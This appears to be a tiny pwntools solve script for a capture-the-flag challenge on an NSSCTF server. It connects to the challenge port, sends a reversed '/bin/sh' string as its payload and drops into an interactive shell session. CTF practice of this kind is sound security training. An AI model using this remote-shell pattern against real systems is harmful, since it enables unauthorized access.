from pwn import *

io = connect("node4.anna.nssctf.cn", 25348)

payload = b"hs/nib/"

io.sendline(payload)

io.interactive()
